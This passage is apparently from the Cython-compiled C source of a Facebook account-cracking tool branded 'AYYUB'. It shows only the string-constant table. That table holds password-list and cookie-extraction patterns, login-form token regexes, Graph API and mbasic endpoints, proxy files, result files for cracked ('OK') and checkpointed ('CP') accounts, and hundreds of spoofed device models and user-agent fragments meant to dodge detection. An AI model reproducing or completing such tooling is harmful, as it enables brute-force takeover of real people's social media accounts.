static const char __pyx_k_November[] = "November";
static const char __pyx_k_OT_7025D[] = "OT-7025D";
static const char __pyx_k_P20_Lite[] = "P20 Lite";
static const char __pyx_k_Pixel_XL[] = "Pixel XL";
static const char __pyx_k_Radar_4G[] = "Radar 4G";
static const char __pyx_k_Realme_2[] = "Realme 2";
static const char __pyx_k_Red_Rice[] = "Red Rice";
static const char __pyx_k_Redmi_11[] = "Redmi 11";
static const char __pyx_k_Redmi_12[] = "Redmi 12";
static const char __pyx_k_Redmi_3S[] = "Redmi 3S";
static const char __pyx_k_Redmi_4A[] = "Redmi 4A";
static const char __pyx_k_Redmi_4X[] = "Redmi 4X";
static const char __pyx_k_Redmi_5A[] = "Redmi 5A";
static const char __pyx_k_Redmi_A1[] = "Redmi A1";
static const char __pyx_k_Redmi_A2[] = "Redmi A2";
static const char __pyx_k_Redmi_A3[] = "Redmi A3";
static const char __pyx_k_Redmi_S2[] = "Redmi S2";
static const char __pyx_k_Redmi_Y1[] = "Redmi Y1";
static const char __pyx_k_Redmi_Y2[] = "Redmi Y2";
static const char __pyx_k_Redmi_Y3[] = "Redmi Y3";
static const char __pyx_k_SGH_E250[] = "SGH-E250";
static const char __pyx_k_SGH_I547[] = "SGH-I547";
static const char __pyx_k_SM_A500F[] = "SM-A500F";
static const char __pyx_k_SM_A500H[] = "SM-A500H";
static const char __pyx_k_SM_G485F[] = "SM-G485F";
static const char __pyx_k_SM_G900F[] = "SM-G900F";
static const char __pyx_k_SM_G920F[] = "SM-G920F";
static const char __pyx_k_SM_G930F[] = "SM-G930F";
static const char __pyx_k_SM_G935F[] = "SM-G935F";
static const char __pyx_k_SM_G950F[] = "SM-G950F";
static const char __pyx_k_SM_J320F[] = "SM-J320F";
static const char __pyx_k_SM_J320H[] = "SM-J320H";
static const char __pyx_k_SM_J320M[] = "SM-J320M";
static const char __pyx_k_SM_J701F[] = "SM-J701F";
static const char __pyx_k_SPH_L720[] = "SPH-L720";
static const char __pyx_k_Stylus_2[] = "Stylus 2";
static const char __pyx_k_V10_AT_T[] = "V10 (AT&T)";
static const char __pyx_k_V20_AT_T[] = "V20 (AT&T)";
static const char __pyx_k_Valencia[] = "Valencia";
static const char __pyx_k_Y336_U02[] = "Y336-U02";
static const char __pyx_k_approval[] = "approval";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_document[] = "document";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_motorola[] = "motorola";
static const char __pyx_k_navigate[] = "navigate";
static const char __pyx_k_passlist[] = "passlist";
static const char __pyx_k_password[] = "&password=";
static const char __pyx_k_platform[] = "platform";
static const char __pyx_k_ps_limit[] = "ps_limit";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_usergent[] = "usergent";
static const char __pyx_k_123456789[] = "123456789";
static const char __pyx_k_38_5_121m[] = "\033[38;5;121m";
static const char __pyx_k_38_5_122m[] = "\033[38;5;122m";
static const char __pyx_k_38_5_123m[] = "\033[38;5;123m";
static const char __pyx_k_38_5_196m[] = "\033[38;5;196m";
static const char __pyx_k_38_5_205m[] = "\033[38;5;205m";
static const char __pyx_k_38_5_244m[] = "\033[38;5;244m]";
static const char __pyx_k_EXCELLENT[] = "EXCELLENT";
static const char __pyx_k_GT_I9300I[] = "GT-I9300I";
static const char __pyx_k_GT_I9301I[] = "GT-I9301I";
static const char __pyx_k_Hongmi_1S[] = "Hongmi 1S";
static const char __pyx_k_Hongmi_4G[] = "Hongmi 4G";
static const char __pyx_k_Maimang_5[] = "Maimang 5";
static const char __pyx_k_Mi_Cancro[] = "Mi Cancro";
static const char __pyx_k_Mi_Mix_2S[] = "Mi Mix 2S";
static const char __pyx_k_Mi_Note10[] = "Mi Note10";
static const char __pyx_k_Mi_Note_2[] = "Mi Note 2";
static const char __pyx_k_Mi_Note_3[] = "Mi Note 3";
static const char __pyx_k_Mi_Note_8[] = "Mi Note 8";
static const char __pyx_k_Mi_One_C1[] = "Mi One C1";
static const char __pyx_k_Milestone[] = "Milestone";
static const char __pyx_k_Pad_6_Pro[] = "Pad 6 Pro";
static const char __pyx_k_Phoenix_2[] = "Phoenix 2";
static const char __pyx_k_Prada_3_0[] = "Prada 3.0";
static const char __pyx_k_Primo_GH7[] = "Primo GH7";
static const char __pyx_k_Qin_2_Pro[] = "Qin 2 Pro";
static const char __pyx_k_Quantum_4[] = "Quantum 4";
static const char __pyx_k_Redmi_K30[] = "Redmi K30";
static const char __pyx_k_Redmi_K40[] = "Redmi K40";
static const char __pyx_k_Redmi_K50[] = "Redmi K50";
static const char __pyx_k_Redmi_K60[] = "Redmi K60";
static const char __pyx_k_Redmi_Pad[] = "Redmi Pad";
static const char __pyx_k_Redmi_Pro[] = "Redmi Pro";
static const char __pyx_k_SM_A500FU[] = "SM-A500FU";
static const char __pyx_k_SM_J320FN[] = "SM-J320FN";
static const char __pyx_k_SM_J510FN[] = "SM-J510FN";
static const char __pyx_k_Sensation[] = "Sensation";
static const char __pyx_k_September[] = "September";
static const char __pyx_k_YaBrowser[] = " YaBrowser/";
static const char __pyx_k_authority[] = "authority";
static const char __pyx_k_b64encode[] = "b64encode";
static const char __pyx_k_c_user_xs[] = "c_user=(.*);xs";
static const char __pyx_k_device_id[] = "device_id";
static const char __pyx_k_error_msg[] = "error_msg";
static const char __pyx_k_hexdigits[] = "hexdigits";
static const char __pyx_k_isenabled[] = "isenabled";
static const char __pyx_k_localtime[] = "localtime";
static const char __pyx_k_max_age_0[] = "max-age=0";
static const char __pyx_k_proxy_txt[] = ".proxy.txt";
static const char __pyx_k_proxylist[] = "proxylist";
static const char __pyx_k_randrange[] = "randrange";
static const char __pyx_k_sec_ch_ua[] = "sec-ch-ua";
static const char __pyx_k_total_ids[] = "total_ids";
static const char __pyx_k_1234567890[] = "1234567890";
static const char __pyx_k_Build_PPR1[] = " Build/PPR1.";
static const char __pyx_k_MiTV_Stick[] = "MiTV Stick";
static const char __pyx_k_Mi_Note_10[] = "Mi Note 10";
static const char __pyx_k_Mi_Note_11[] = "Mi Note 11";
static const char __pyx_k_Mix_Fold_2[] = "Mix Fold 2";
static const char __pyx_k_Optimus_Vu[] = "Optimus Vu";
static const char __pyx_k_Pearl_8100[] = "Pearl 8100";
static const char __pyx_k_Redmi_Note[] = "Redmi Note";
static const char __pyx_k_Redmi_note[] = "Redmi note";
static const char __pyx_k_Storm_9530[] = "Storm 9530";
static const char __pyx_k_User_Agent[] = "User-Agent";
static const char __pyx_k_V20_Sprint[] = "V20 (Sprint)";
static const char __pyx_k_VR_Bot_552[] = "VR Bot 552";
static const char __pyx_k_ValueError[] = "ValueError";
static const char __pyx_k_Volt_LS740[] = "Volt LS740";
static const char __pyx_k_br_virshon[] = "br_virshon";
static const char __pyx_k_checkpoint[] = "checkpoint";
static const char __pyx_k_exceptions[] = "exceptions";
static const char __pyx_k_idpaslogin[] = "idpaslogin";
static const char __pyx_k_password_2[] = "password";
static const char __pyx_k_session_id[] = "session_id";
static const char __pyx_k_splitlines[] = "splitlines";
static const char __pyx_k_subprocess[] = "subprocess";
static const char __pyx_k_try_number[] = "try_number";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_1_97m_1_37m[] = "\033[1;97mm";
static const char __pyx_k_38_5_244m_2[] = "\033[38;5;244m[";
static const char __pyx_k_38_5_244m_3[] = " \033[38;5;244m[";
static const char __pyx_k_38_5_244m_4[] = "\r\r\033[38;5;244m[";
static const char __pyx_k_38_5_244m_5[] = "\033[38;5;244m";
static const char __pyx_k_AppleWebKit[] = ") AppleWebKit/";
static const char __pyx_k_Black_Shark[] = "Black Shark";
static const char __pyx_k_Hongmi_2_3G[] = "Hongmi 2 3G";
static const char __pyx_k_Hongmi_2_4G[] = "Hongmi 2 4G";
static const char __pyx_k_MiTV_4A_Pro[] = "MiTV 4A Pro";
static const char __pyx_k_Mi_CC_9_Pro[] = "Mi CC 9 Pro";
static const char __pyx_k_Mi_Mix_3_5G[] = "Mi Mix 3 5G";
static const char __pyx_k_Mi_Mix_Fold[] = "Mi Mix Fold";
static const char __pyx_k_Mi_Note_LTE[] = "Mi Note LTE";
static const char __pyx_k_Mi_Note_Pro[] = "Mi Note Pro";
static const char __pyx_k_Mi_One_Plus[] = "Mi One Plus";
static const char __pyx_k_Motion_Plus[] = "Motion Plus";
static const char __pyx_k_Moto_G_Play[] = "Moto G Play";
static const char __pyx_k_Note_12_Pro[] = "Note 12 Pro";
static const char __pyx_k_PhotosAYYUB[] = "PhotosAYYUB";
static const char __pyx_k_Radar_C110e[] = "Radar C110e";
static const char __pyx_k_Redmi_Note7[] = "Redmi Note7";
static const char __pyx_k_Redmi_Note8[] = "Redmi Note8";
static const char __pyx_k_Redmi_Note9[] = "Redmi Note9";
static const char __pyx_k_Star_3_Duos[] = "Star 3 Duos";
static const char __pyx_k_V10_Verizon[] = "V10 (Verizon)";
static const char __pyx_k_V20_Verizon[] = "V20 (Verizon)";
static const char __pyx_k_accessToken[] = "accessToken";
static const char __pyx_k_log_cookies[] = "log_cookies";
static const char __pyx_k_max_workers[] = "max_workers";
static const char __pyx_k_random_seed[] = "random_seed";
static const char __pyx_k_session_key[] = "session_key";
static const char __pyx_k_sessions_py[] = "sessions.py";
static const char __pyx_k_sim_country[] = "sim_country";
static const char __pyx_k_sim_serials[] = "sim_serials";
static const char __pyx_k_socksku_txt[] = "socksku.txt";
static const char __pyx_k_0_Safari_534[] = ".0 Safari/534.";
static const char __pyx_k_Content_Type[] = "Content-Type";
static const char __pyx_k_FBOP_19_FBCA[] = ";FBOP/19;FBCA/";
static const char __pyx_k_M2_38_5_244m[] = "M2\033[38;5;244m]";
static const char __pyx_k_Mi_Pad_5_Pro[] = "Mi Pad 5 Pro";
static const char __pyx_k_Moto_E4_Plus[] = "Moto E4 Plus";
static const char __pyx_k_Moto_E5_Plus[] = "Moto E5 Plus";
static const char __pyx_k_Moto_G5_Plus[] = "Moto G5 Plus";
static const char __pyx_k_P10_Lite_LTE[] = "P10 Lite LTE";
static const char __pyx_k_Pacific_800i[] = "Pacific 800i";
static const char __pyx_k_Pocophone_F1[] = "Pocophone F1";
static const char __pyx_k_Redmi_5_Plus[] = "Redmi 5 Plus";
static const char __pyx_k_Redmi_Note10[] = "Redmi Note10";
static const char __pyx_k_Redmi_Note8T[] = "Redmi Note8T";
static const char __pyx_k_Redmi_Note_1[] = "Redmi Note 1";
static const char __pyx_k_Redmi_Note_2[] = "Redmi Note 2";
static const char __pyx_k_Redmi_Note_3[] = "Redmi Note 3";
static const char __pyx_k_Redmi_Note_4[] = "Redmi Note 4";
static const char __pyx_k_Redmi_Note_5[] = "Redmi Note 5";
static const char __pyx_k_Redmi_Note_6[] = "Redmi Note 6";
static const char __pyx_k_Redmi_Note_7[] = "Redmi Note 7";
static const char __pyx_k_Redmi_Note_9[] = "Redmi Note 9";
static const char __pyx_k_T500XXU3BUA8[] = "T500XXU3BUA8";
static const char __pyx_k_T970XXU3BUI7[] = "T970XXU3BUI7";
static const char __pyx_k_V10_T_Mobile[] = "V10 (T-Mobile)";
static const char __pyx_k_V20_T_Mobile[] = "V20 (T-Mobile)";
static const char __pyx_k_Vibe_K5_Note[] = "Vibe K5 Note";
static const char __pyx_k_X_FB_Net_HNI[] = "X-FB-Net-HNI";
static const char __pyx_k_X_FB_SIM_HNI[] = "X-FB-SIM-HNI";
static const char __pyx_k_Yota_Phone_2[] = "Yota Phone 2";
static const char __pyx_k_authenticate[] = "authenticate";
static const char __pyx_k_check_output[] = "check_output";
static const char __pyx_k_community_id[] = "community_id";
static const char __pyx_k_content_type[] = "content-type";
static const char __pyx_k_crack_submit[] = "crack_submit";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_initializing[] = "_initializing";
static const char __pyx_k_is_coroutine[] = "_is_coroutine";
static const char __pyx_k_reg_instance[] = "reg_instance";
static const char __pyx_k_sdcard_AYYUB[] = "/sdcard/AYYUB";
static const char __pyx_k_x_fb_net_hni[] = "x-fb-net-hni";
static const char __pyx_k_x_fb_sim_hni[] = "x-fb-sim-hni";
static const char __pyx_k_1_97m_1_37m_2[] = "\r\033[1;97mm";
static const char __pyx_k_A525FXXU3AUG4[] = "A525FXXU3AUG4";
static const char __pyx_k_A715FXXU3ATI8[] = "A715FXXU3ATI8";
static const char __pyx_k_Authorization[] = "Authorization";
static const char __pyx_k_Black_Shark_2[] = "Black Shark 2";
static const char __pyx_k_Black_Shark_3[] = "Black Shark 3";
static const char __pyx_k_Black_Shark_4[] = "Black Shark 4";
static const char __pyx_k_Black_Shark_5[] = "Black Shark 5";
static const char __pyx_k_F916BXXU1BTKF[] = "F916BXXU1BTKF";
static const char __pyx_k_G950FXXS5DSF1[] = "G950FXXS5DSF1";
static const char __pyx_k_G950FXXS6DTA1[] = "G950FXXS6DTA1";
static const char __pyx_k_G950FXXS8DTC6[] = "G950FXXS8DTC6";
static const char __pyx_k_G950FXXU3CRGH[] = "G950FXXU3CRGH";
static const char __pyx_k_G950FXXU4DSBA[] = "G950FXXU4DSBA";
static const char __pyx_k_G975USQU4ETG1[] = "G975USQU4ETG1";
static const char __pyx_k_G985FXXU7DTJ2[] = "G985FXXU7DTJ2";
static const char __pyx_k_G998USQU1ATCU[] = "G998USQU1ATCU";
static const char __pyx_k_MiTV_Stick_4K[] = "MiTV Stick 4K";
static const char __pyx_k_Mi_Pad_4_Plus[] = "Mi Pad 4 Plus";
static const char __pyx_k_Mobile_Safari[] = " Mobile Safari/";
static const char __pyx_k_Moment_Sprint[] = "Moment (Sprint)";
static const char __pyx_k_Moto_E3_Power[] = "Moto E3 Power";
static const char __pyx_k_Moto_G5s_Plus[] = "Moto G5s Plus";
static const char __pyx_k_N970FXXS8ETK4[] = "N970FXXS8ETK4";
static const char __pyx_k_N986BXXU1BTJ4[] = "N986BXXU1BTJ4";
static const char __pyx_k_Redmi_Note10T[] = "Redmi Note10T";
static const char __pyx_k_Redmi_Note_12[] = "Redmi Note 12";
static const char __pyx_k_Redmi_Note_13[] = "Redmi Note 13";
static const char __pyx_k_Redmi_Note_4X[] = "Redmi Note 4X";
static const char __pyx_k_Redmi_Note_5A[] = "Redmi Note 5A";
static const char __pyx_k_Redmi_Note_8T[] = "Redmi Note 8T";
static const char __pyx_k_Redmi_Note_9S[] = "Redmi Note 9S";
static const char __pyx_k_Redmi_Note_9T[] = "Redmi Note 9T";
static const char __pyx_k_Redmi_Y1_Lite[] = "Redmi Y1 Lite";
static const char __pyx_k_Torch_4G_9810[] = "Torch 4G 9810";
static const char __pyx_k_Y6_Prime_2018[] = "Y6 Prime (2018)";
static const char __pyx_k_YaApp_Android[] = " YaApp_Android/";
static const char __pyx_k_advertiser_id[] = "advertiser_id";
static const char __pyx_k_cache_control[] = "cache-control";
static const char __pyx_k_class_getitem[] = "__class_getitem__";
static const char __pyx_k_logged_out_id[] = "logged_out_id";
static const char __pyx_k_name_li_value[] = "name=\"li\" value=\"(.*?)\"";
static const char __pyx_k_Black_Shark_3S[] = "Black Shark 3S";
static const char __pyx_k_FBAN_FB4A_FBAV[] = "[FBAN/FB4A;FBAV/";
static const char __pyx_k_Mi_Note_10_Pro[] = "Mi Note 10 Pro";
static const char __pyx_k_Moto_E2_4G_LTE[] = "Moto E2 (4G LTE)";
static const char __pyx_k_Moto_G_2nd_Gen[] = "Moto G 2nd Gen";
static const char __pyx_k_P30_Pro_Global[] = "P30 Pro (Global)";
static const char __pyx_k_Redmi_Note_12T[] = "Redmi Note 12T";
static const char __pyx_k_enroll_misauth[] = "enroll_misauth";
static const char __pyx_k_name_lsd_value[] = "name=\"lsd\" value=\"(.*?)\"";
static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
static const char __pyx_k_sec_fetch_user[] = "sec-fetch-user";
static const char __pyx_k_swan_mibrowser[] = " swan-mibrowser";
static const char __pyx_k_urllib_request[] = "urllib.request";
static const char __pyx_k_viewport_width[] = "viewport-width";
static const char __pyx_k_0_Safari_537_36[] = ".0 Safari/537.36";
static const char __pyx_k_Accept_Encoding[] = "Accept-Encoding";
static const char __pyx_k_ConnectionError[] = "ConnectionError";
static const char __pyx_k_Hongmi_Note_1TD[] = "Hongmi Note 1TD";
static const char __pyx_k_MT6765_G_Series[] = "MT6765 G Series";
static const char __pyx_k_Mate_20_X_China[] = "Mate 20 X (China)";
static const char __pyx_k_Mi_Note_10_Lite[] = "Mi Note 10 Lite";
static const char __pyx_k_Mi_Pad_5_Pro_5G[] = "Mi Pad 5 Pro 5G";
static const char __pyx_k_PPR1_180610_011[] = "PPR1.180610.011";
static const char __pyx_k_PPR2_180905_006[] = "PPR2.180905.006";
static const char __pyx_k_PQ1A_181205_006[] = "PQ1A.181205.006";
static const char __pyx_k_PQ3B_190801_002[] = "PQ3B.190801.002";
static const char __pyx_k_QKQ1_190910_002[] = "QKQ1.190910.002";
static const char __pyx_k_QP1A_191105_003[] = "QP1A.191105.003";
static const char __pyx_k_Redmi_Note_9_5G[] = "Redmi Note 9 5G";
static const char __pyx_k_SQ1A_211205_008[] = "SQ1A.211205.008";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_allow_redirects[] = "allow_redirects";
static const char __pyx_k_android_version[] = "android_version";
static const char __pyx_k_meta_inf_fbmeta[] = "meta_inf_fbmeta";
static const char __pyx_k_name_m_ts_value[] = "name=\"m_ts\" value=\"(.*?)\"";
static const char __pyx_k_network_country[] = "network_country";
static const char __pyx_k_python_AYYUB_py[] = "python AYYUB.py";
static const char __pyx_k_sdcard_kiron_py[] = "/sdcard/kiron.py";
static const char __pyx_k_session_cookies[] = "session_cookies";
static const char __pyx_k_Black_Shark_Helo[] = "Black Shark Helo";
static const char __pyx_k_Redmi_Note_5_Pro[] = "Redmi Note 5 Pro";
static const char __pyx_k_Redmi_Note_7_Pro[] = "Redmi Note 7 Pro";
static const char __pyx_k_Redmi_Note_8_Pro[] = "Redmi Note 8 Pro";
static const char __pyx_k_Redmi_Note_9T_5G[] = "Redmi Note 9T 5G";
static const char __pyx_k_Redmi_Note_9_Pro[] = "Redmi Note 9 Pro";
static const char __pyx_k_Redmi_Note_Prime[] = "Redmi Note Prime";
static const char __pyx_k_Vega_Iron_2_WiFi[] = "Vega Iron 2 WiFi";
static const char __pyx_k_X_FB_HTTP_Engine[] = "X-FB-HTTP-Engine";
static const char __pyx_k_Y5_Dual_SIM_2017[] = "Y5 Dual SIM (2017)";
static const char __pyx_k_Y6_Dual_SIM_2018[] = "Y6 Dual SIM (2018)";
static const char __pyx_k_credentials_type[] = "credentials_type";
static const char __pyx_k_family_device_id[] = "family_device_id";
static const char __pyx_k_sec_ch_ua_mobile[] = "sec-ch-ua-mobile";
static const char __pyx_k_www_facebook_com[] = "www.facebook.com";
static const char __pyx_k_x_fb_http_engine[] = "x-fb-http-engine";
static const char __pyx_k_136_Mobile_Safari[] = ".136 Mobile Safari";
static const char __pyx_k_BD_locals_genexpr[] = "BD.<locals>.genexpr";
static const char __pyx_k_Black_Shark_4_Pro[] = "Black Shark 4 Pro";
static const char __pyx_k_Black_Shark_5_Pro[] = "Black Shark 5 Pro";
static const char __pyx_k_FileNotFoundError[] = "FileNotFoundError";
static const char __pyx_k_Quad_EVO_Energy_5[] = "Quad EVO Energy 5";
static const char __pyx_k_Redmi_Note_15_Pro[] = "Redmi Note 15 Pro";
static const char __pyx_k_Safari_537_36_Edg[] = " Safari/537.36 Edg/";
static const char __pyx_k_Vision_3_Dual_SIM[] = "Vision 3 Dual SIM";
static const char __pyx_k_WOW64_AppleWebKit[] = "; WOW64) AppleWebKit/";
static const char __pyx_k_error_detail_type[] = "error_detail_type";
static const char __pyx_k_38_5_244m_38_5_46m[] = "\r\033[38;5;244m[\033[38;5;46m";
static const char __pyx_k_AYYUB_CP_38_5_244m[] = "AYYUB-CP\033[38;5;244m]";
static const char __pyx_k_OPM2_171026_006_C1[] = "OPM2.171026.006.C1";
static const char __pyx_k_OPM6_171019_030_K1[] = "OPM6.171019.030.K1";
static const char __pyx_k_PQ1A_181205_002_A1[] = "PQ1A.181205.002.A1";
static const char __pyx_k_RD1A_201105_003_C1[] = "RD1A.201105.003.C1";
static const char __pyx_k_RP1A_201005_004_A1[] = "RP1A.201005.004.A1";
static const char __pyx_k_SD1A_210817_037_A1[] = "SD1A.210817.037.A1";
static const char __pyx_k_TQ1A_230105_001_A3[] = "TQ1A.230105.001.A3";
static const char __pyx_k_ThreadPoolExecutor[] = "ThreadPoolExecutor";
static const char __pyx_k_X_FB_Friendly_Name[] = "X-FB-Friendly-Name";
static const char __pyx_k_asyncio_coroutines[] = "asyncio.coroutines";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_concurrent_futures[] = "concurrent.futures";
static const char __pyx_k_name_jazoest_value[] = "name=\"jazoest\" value=\"(.*?)\"";
static const char __pyx_k_sec_ch_ua_platform[] = "sec-ch-ua-platform";
static const char __pyx_k_unrecognized_tries[] = "unrecognized_tries";
static const char __pyx_k_537_36_Puffin_9_7_2[] = "/537.36 Puffin/9.7.2.";
static const char __pyx_k_ModuleNotFoundError[] = "ModuleNotFoundError";
static const char __pyx_k_Moto_X_2nd_Gen_AT_T[] = "Moto X 2nd Gen (AT&T)";
static const char __pyx_k_MultiPhone_3350_Duo[] = "MultiPhone 3350 Duo";
static const char __pyx_k_MultiPhone_4044_Duo[] = "MultiPhone 4044 Duo";
static const char __pyx_k_MultiPhone_5504_DUO[] = "MultiPhone 5504 DUO";
static const char __pyx_k_Multiphone_7600_Duo[] = "Multiphone 7600 Duo";
static const char __pyx_k_Redmi_Note_5A_Prime[] = "Redmi Note 5A Prime";
static const char __pyx_k_Redmi_Note_9_Pro_5G[] = "Redmi Note 9 Pro 5G";
static const char __pyx_k_api1_locals_genexpr[] = "api1.<locals>.genexpr";
static const char __pyx_k_api2_locals_genexpr[] = "api2.<locals>.genexpr";
static const char __pyx_k_client_country_code[] = "client_country_code";
static const char __pyx_k_com_facebook_katana[] = "com.facebook.katana";
static const char __pyx_k_density_2_25_height[] = "{density=2.25,height=";
static const char __pyx_k_fb_api_caller_class[] = "fb_api_caller_class";
static const char __pyx_k_generate_machine_id[] = "generate_machine_id";
static const char __pyx_k_getprop_ro_build_id[] = "getprop ro.build.id";
static const char __pyx_k_mbasic_facebook_com[] = "mbasic.facebook.com";
static const char __pyx_k_picture_type_normal[] = "/picture?type=normal";
static const char __pyx_k_sdcard_AYYUB_CP_txt[] = "/sdcard/AYYUB-CP.txt";
static const char __pyx_k_10_1_YaSearchBrowser[] = ".10.1 YaSearchBrowser/";
static const char __pyx_k_38_5_244m_38_5_46m_2[] = "\033[38;5;244m/\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46m_3[] = " \342\224\201\033[38;5;244m\033[38;5;46m ";
static const char __pyx_k_38_5_244m_38_5_46m_4[] = " \033[38;5;244m\342\200\223\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46m_5[] = " \033[38;5;244m|\033[38;5;46m ";
static const char __pyx_k_38_5_244m_38_5_46m_6[] = "\r\r\033[38;5;244m[\033[38;5;46m";
static const char __pyx_k_38_5_244m_38_5_46m_7[] = " ~\033[38;5;244m\033[38;5;46m ";
static const char __pyx_k_38_5_244m_38_5_46m_8[] = "\033[38;5;244m-\033[38;5;46m";
static const char __pyx_k_Please_Confirm_Email[] = "Please Confirm Email";
static const char __pyx_k_Redmi_Note_9_Pro_Max[] = "Redmi Note 9 Pro Max";
static const char __pyx_k_X_FB_Connection_Type[] = "X-FB-Connection-Type";
static const char __pyx_k_button_with_disabled[] = "button_with_disabled";
static const char __pyx_k_sdcard_AYYUB_OLD_txt[] = "/sdcard/AYYUB-OLD.txt";
static const char __pyx_k_x_fb_connection_type[] = "x-fb-connection-type";
static const char __pyx_k_Mate_10_Lite_Dual_SIM[] = "Mate 10 Lite Dual SIM";
static const char __pyx_k_Moto_G3_Turbo_Edition[] = "Moto G3 Turbo Edition";
static const char __pyx_k_Stylo_2_Plus_T_Mobile[] = "Stylo 2 Plus (T-Mobile)";
static const char __pyx_k_Vibe_K5_Plus_Dual_SIM[] = "Vibe K5 Plus Dual SIM";
static const char __pyx_k_M1_38_5_244m_38_5_244m[] = "M1\033[38;5;244m]\n\033[38;5;244m[";
static const char __pyx_k_Mi_Laser_Projector_150[] = "Mi Laser Projector 150";
static const char __pyx_k_Mozilla_5_0_Windows_NT[] = "Mozilla/5.0 (Windows NT ";
static const char __pyx_k_Y5_Prime_2018_Dual_SIM[] = "Y5 Prime 2018 Dual SIM";
static const char __pyx_k_1_en_US_AppleWebKit_534[] = ".1; en-US) AppleWebKit/534.";
static const char __pyx_k_KHTML_like_Gecko_Chrome[] = " (KHTML, like Gecko) Chrome/";
static const char __pyx_k_sdcard_AYYUB_RND_CP_txt[] = "/sdcard/AYYUB/RND-CP.txt";
static const char __pyx_k_x_fb_connection_quality[] = "x-fb-connection-quality";
static const char __pyx_k_KHTML_like_Gecko_Version[] = " (KHTML, like Gecko) Version/";
static const char __pyx_k_Mozilla_5_0_Windows_NT_6[] = "Mozilla/5.0 (Windows NT 6.";
static const char __pyx_k_fb_api_req_friendly_name[] = "fb_api_req_friendly_name";
static const char __pyx_k_generate_session_cookies[] = "generate_session_cookies";
static const char __pyx_k_getprop_ro_product_brand[] = "getprop ro.product.brand";
static const char __pyx_k_getprop_ro_product_model[] = "getprop ro.product.model";
static const char __pyx_k_https_graph_facebook_com[] = "https://graph.facebook.com/";
static const char __pyx_k_38_5_244m_38_5_46m_CHOICE[] = "?\033[38;5;244m]\033[38;5;46m CHOICE : ";
static const char __pyx_k_38_5_81mCP_1_37m_38_5_81m[] = " \033[38;5;81mCP\033[1;37m|\033[38;5;81m";
static const char __pyx_k_Mozilla_5_0_Linux_Android[] = "Mozilla/5.0 (Linux; Android ";
static const char __pyx_k_X_FB_Connection_Bandwidth[] = "X-FB-Connection-Bandwidth";
static const char __pyx_k_generate_analytics_claims[] = "generate_analytics_claims";
static const char __pyx_k_https_mbasic_facebook_com[] = "https://mbasic.facebook.com";
static const char __pyx_k_upgrade_insecure_requests[] = "upgrade-insecure-requests";
static const char __pyx_k_x_fb_connection_bandwidth[] = "x-fb-connection-bandwidth";
static const char __pyx_k_Installing_missing_modules[] = "\n Installing missing modules ...";
static const char __pyx_k_Redmi_Note_10Redmi_Note_11[] = "Redmi Note 10Redmi Note 11";
static const char __pyx_k_currently_logged_in_userid[] = "currently_logged_in_userid";
static const char __pyx_k_getprop_gsm_operator_alpha[] = "getprop gsm.operator.alpha";
static const char __pyx_k_Davik_2_1_0_Linux_U_Android[] = "Davik/2.1.0 (Linux; U; Android ";
static const char __pyx_k_Multipad_2_Ultra_Duo_8_0_3G[] = "Multipad 2 Ultra Duo 8.0 3G";
static const char __pyx_k_sdcard_AYYUB_FILE_M1_OK_txt[] = "/sdcard/AYYUB-FILE-M1-OK.txt";
static const char __pyx_k_sdcard_AYYUB_FILE_M2_OK_txt[] = "/sdcard/AYYUB-FILE-M2-OK.txt";
static const char __pyx_k_sec_ch_prefers_color_scheme[] = "sec-ch-prefers-color-scheme";
static const char __pyx_k_sec_ch_ua_full_version_list[] = "sec-ch-ua-full-version-list";
static const char __pyx_k_011_en_us_AppleWebKit_537_36[] = ".011; en-us) AppleWebKit/537.36 ";
static const char __pyx_k_38_5_244m_38_5_46m_38_5_244m[] = "\r\r\033[38;5;244m (\033[38;5;46m\360\237\215\252\033[38;5;244m)>>";
static const char __pyx_k_38_5_244m_38_5_46m_EXIT_DONE[] = "*\033[38;5;244m]\033[38;5;46m EXIT DONE ";
static const char __pyx_k_38_5_244m_38_5_46m_FILE_NAME[] = "?\033[38;5;244m]\033[38;5;46m FILE NAME : ";
static const char __pyx_k_38_5_244m_KEY_IS_NOT_APPROVED[] = "\033[38;5;244m KEY IS NOT APPROVED";
static const char __pyx_k_0_38_5_244m_38_5_46m_EXIT_TOOL[] = "0\033[38;5;244m]\033[38;5;46m EXIT TOOL";
static const char __pyx_k_0_Win64_x64_AppleWebKit_537_36[] = ".0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/";
static const char __pyx_k_1_34m_1_34m_38_5_244m_38_5_46m[] = "\r\033[1;34m(\360\237\215\252\033[1;34m)\033[38;5;244m\342\200\223\033[38;5;46m \033[1;37m";
static const char __pyx_k_1_BroPP_1_0_SA_3_Mobile_Safari[] = ".1 BroPP/1.0 SA/3 Mobile Safari/537.36";
static const char __pyx_k_38_5_244m_1_97m_38_5_244m_38_5[] = "\033[38;5;244m[\033[1;97m*\033[38;5;244m]\033[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ";
static const char __pyx_k_38_5_244m_38_5_244mAYYUB_OK_38[] = "\r\033[38;5;244m[\033[38;5;244mAYYUB-OK\033[38;5;244m]\033[38;5;244m ";
static const char __pyx_k_38_5_244m_38_5_46m_DO_YOU_WENT[] = "*\033[38;5;244m]\033[38;5;46m DO YOU WENT SHOW CP ACCOUNT  \033[38;5;244m[\033[38;5;46mY\033[38;5;244m/\033[1;91mN\033[38;5;244m]";
static const char __pyx_k_38_5_244m_38_5_46m_NO_INTERNET[] = "*\033[38;5;244m]\033[38;5;46m NO INTERNET CONNECTION...";
static const char __pyx_k_38_5_244m_38_5_46m_PASSWORD_NO[] = "*\033[38;5;244m]\033[38;5;46m PASSWORD NO ";
static const char __pyx_k_38_5_244m_38_5_46m_PRESS_ENTER[] = "*\033[38;5;244m]\033[38;5;46m PRESS ENTER TO BACK ";
